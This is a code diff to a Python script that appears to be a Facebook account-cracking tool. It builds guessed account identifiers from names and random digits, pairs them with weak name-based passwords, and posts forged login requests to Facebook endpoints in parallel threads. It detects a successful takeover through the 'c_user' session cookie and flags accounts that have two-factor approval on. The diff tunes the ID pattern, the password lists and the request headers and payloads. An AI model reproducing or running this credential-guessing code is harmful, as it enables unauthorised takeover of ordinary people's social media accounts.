@@ -1036,7 +1036,7 @@ def g_clone():
     except ValueError:
         limit = 5000
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        nmp = ''.join(random.choice(string.digits) for _ in range(3))
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
@@ -1066,8 +1066,8 @@ def g_clone():
         print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
-            uid = first+'.'+last+'.'+love+domain
-            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
+            uid = first+last+love+domain
+            pwx = [first+last,first+' '+last,first+'12',first+'123',first+'1234']
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1357,8 +1357,8 @@ def mbasic(uid,pwx,tl):
             "adid": str(uuid.uuid4()),
             "format": "json",
             "device_id": str(uuid.uuid4()),
-            "email": '100078110812030',
-            "password": "#PWD_MSGR:0:{}:{}".format(str(time.time()).split('.')[0],'767980'),
+            "email": uid,
+            "password": "#PWD_MSGR:0:{}:{}".format(str(time.time()).split('.')[0],pw),
             "generate_analytics_claim": "1",
             "community_id": "",
             "cpl": "true",
@@ -1731,67 +1731,29 @@ def freeq(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
-            data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'api_key': '125013557575103',
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '1',
-            'signed_next': '1',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '130413_xEX8',
-            'lgnjs': '1752091453',
-            'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'true',
-            'ab_test_data': 'A/AAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAA/AABAAC',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': 'SVRVaCkSemjPQelgXB0y0CcL',
-            'sb': 'SVRVaPjD8b4EFyHYH5_mO7WT',
-            'ps_l': '1',
-            'ps_n': '1',
-            'locale': 'hi_IN',
-            'm_pixel_ratio': '3.5',
-            'dpr': '1',
-            'fr': '0gLfD3AAbAoY0O6GN..BoVVRJ..AAA.0.0.BobsoP.AWcnG6-IYXL7Vfcx4YzUWRE2uTc',
-            'sfiu': 'AYgVFAKizIH9EA1rhiyDnwE9FCLMwd5Cne5wGjzzgSgt19w1-4YULcz_xrizb2tsPMEX0prMphcH_diSYdwmf-5bw4vEVOnr4uoDRkrW0apCHP61o8YZl-PlURfx5V_p9gL1QtDBl7dEA8m6Bt95TgbGRdXA_1EKpgtRhNSaTeW22VzB60wDf98GCvnjKa8qoECZvqC1e28a8NsN-ZnY06P0yRHoY7gvIpss32Thb0gEig',
-            'wd': '1189x773',}
+            data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
+            'authority': 'limited.facebook.com',
+            'accept': '/',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=125013557575103&kid_directed_site=0&app_id=125013557575103&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D125013557575103%26cbt%3D1711370324839%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbaaf6f7fe194608f%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%26client_id%3D125013557575103%26display%3Dpopup%26domain%3Dipiccy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fipiccy.com%252F%26locale%3Den_US%26logger_id%3Dfbaf3acf33bf3433c%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd35ec894a7163aa6%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%2526frame%253Df0e602a254491d629%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dun',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="8.0.0.0", "Chromium";v="138.0.7204.51", "Google Chrome";v="138.0.7204.51"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            # 'cookie': 'datr=AvxaauBxe8J2e6uqNRe7Ks5u; sb=AvxaanntJgRoS-6c3x6h_Z-w; m_pixel_ratio=2.75; wd=393x851; ps_l=1; ps_n=1; fr=0mN3NySo4ygtsuEdo..BqWvwC..AAA.0.0.BqWvwc.AWf9_qxR9LNotvAZnbuzCekImP0',
+            'origin': 'https://limited.facebook.com',
+            'referer': 'https://limited.facebook.com/login/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
-            'viewport-width': '1189',}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',}  
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D125013557575103%26cbt%3D1711370324839%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbaaf6f7fe194608f%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%26client_id%3D125013557575103%26display%3Dpopup%26domain%3Dipiccy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fipiccy.com%252F%26locale%3Den_US%26logger_id%3Dfbaf3acf33bf3433c%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd35ec894a7163aa6%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%2526frame%253Df0e602a254491d629%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dun&lwv=100'
-            po = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=False).text
+            po = Session.post(url, headers=headers, data=data, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
